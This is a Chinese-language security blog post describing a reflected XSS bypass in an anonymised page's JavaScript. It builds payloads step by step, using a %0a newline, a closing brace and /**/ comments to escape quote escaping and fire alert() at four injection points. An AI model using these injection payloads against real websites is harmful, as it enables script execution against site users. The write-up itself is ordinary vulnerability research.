<!DOCTYPE html><html lang="zh"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 一处有趣的反射型XSS · p7e4</title><meta name="description" content="一处有趣的反射型XSS - p7e4"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://p7e4.js.org/atom.xml" title="p7e4"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/p7e4" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">一处有趣的反射型XSS</h1><div class="post-info">Feb 14, 2020</div><div class="post-content"><p>一处有趣的反射型XSS</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>页面源码：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//func('/xxxxxxxx?id=xss_payload');</span></span><br><span class="line">    <span class="built_in">window</span>.location = $url(<span class="string">"/abc?id=xss_payload"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  func(<span class="string">"xss_payload"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params">action</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func</span><br><span class="line">	(</span><br><span class="line">		<span class="string">"xss_payload"</span>, </span><br><span class="line">		<span class="string">""</span>,</span><br><span class="line">		<span class="literal">null</span>,</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>一个参数在页面的有4处输出点，都将双引号转义掉了<br>那么如何利用呢，既然第一处没有任何过滤就先从第一处下手<br>通过换行符%0a进行换脱离当前注释行<code>%0aalert(&quot;xss&quot;);//</code><br>然后代码就变成了这样  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//func('/xxxxxxxx?id=</span></span><br><span class="line">	alert(<span class="string">"xss"</span>)<span class="comment">//');</span></span><br><span class="line">    <span class="built_in">window</span>.location = $url(<span class="string">"/abc?id=</span></span><br><span class="line"><span class="string">    	alert("</span>xss<span class="string">")//"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  func(<span class="string">"</span></span><br><span class="line"><span class="string">  	alert("</span>xss<span class="string">")//"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params">action</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func</span><br><span class="line">	(</span><br><span class="line">		<span class="string">"</span></span><br><span class="line"><span class="string">		alert("</span>xss<span class="string">")//"</span>, </span><br><span class="line">		<span class="string">""</span>,</span><br><span class="line">		<span class="literal">null</span>,</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然第一处看起来没有问题了，但是后面的三处都因为首双引号没有闭合导致报错，payload也无法执行<br><code>SyntaxError: &quot;&quot; string literal contains an unescaped line break</code><br>因为双引号被过滤了，我们没有办法闭合双引号<br><em>那尝试一下多行注释?</em><br><code>/**/</code><br>构造payload: <code>%0A/**/alert(&quot;xss&quot;);/*</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//func('/xxxxxxxx?id=</span></span><br><span class="line">	<span class="comment">/**/alert("xss");/*');</span></span><br><span class="line"><span class="comment">    window.location = $url("/abc?id=</span></span><br><span class="line"><span class="comment">    /**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">function B()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  func("</span></span><br><span class="line"><span class="comment">  /**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">function C(action)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	func</span></span><br><span class="line"><span class="comment">	(</span></span><br><span class="line"><span class="comment">		"</span></span><br><span class="line"><span class="comment">		/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*", </span></span><br><span class="line"><span class="comment">		"",</span></span><br><span class="line"><span class="comment">		null,</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这样看上去就ok了，乍一看最后一个<code>/*</code>还没有闭合，但是我得到的报错是<code>SyntaxError: missing } after function</code><br>继续往后看，这是因为后面还有注释刚好闭合掉了  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 描述xxxxxxxxxxxxx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@id </span>事件id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">H</span>(<span class="params">id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>然后在%0a后加入<code>}</code>进行闭合  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//func('/xxxxxxxx?id=</span></span><br><span class="line">	&#125;<span class="comment">/**/alert("xss");/*');</span></span><br><span class="line"><span class="comment">    window.location = $url("/abc?id=</span></span><br><span class="line"><span class="comment">    &#125;/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">function B()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  func("</span></span><br><span class="line"><span class="comment">  &#125;/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*");</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">function C(action)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	func</span></span><br><span class="line"><span class="comment">	(</span></span><br><span class="line"><span class="comment">		"</span></span><br><span class="line"><span class="comment">		&#125;/**/</span>alert(<span class="string">"xss"</span>);<span class="comment">/*", </span></span><br><span class="line"><span class="comment">		"",</span></span><br><span class="line"><span class="comment">		null,</span></span><br><span class="line"><span class="comment">	);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>连弹4次框，（代码高亮有点小问题）</p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/04/04/bsz_acm/" class="prev">PREV</a><a href="/2020/01/16/sec_code/" class="next">NEXT</a></div><div class="copyright"><p>Copyright © p7e4 2020.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>